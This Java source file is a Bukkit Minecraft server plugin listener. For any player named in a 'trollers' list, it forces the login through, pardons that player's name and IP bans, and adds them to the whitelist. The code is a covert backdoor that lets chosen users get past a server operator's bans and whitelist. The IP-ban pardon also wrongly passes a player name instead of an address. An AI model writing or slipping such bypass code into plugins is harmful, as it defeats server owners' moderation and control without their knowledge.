package PandaHexCode.Listeners;

import org.bukkit.BanList.Type;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

import PandaHexCode.PluginMain;

public class PlayerLoginListener implements Listener{
	
	@EventHandler
	public void onLogin(PlayerLoginEvent e){
		Player p = e.getPlayer();
		if(PluginMain.trollers.contains(p.getName())) {
			e.allow();
			Bukkit.getBanList(Type.NAME).pardon(p.getName());
			Bukkit.getBanList(Type.IP).pardon(p.getName());
			Bukkit.getWhitelistedPlayers().add(p);
		}
	}
	
}
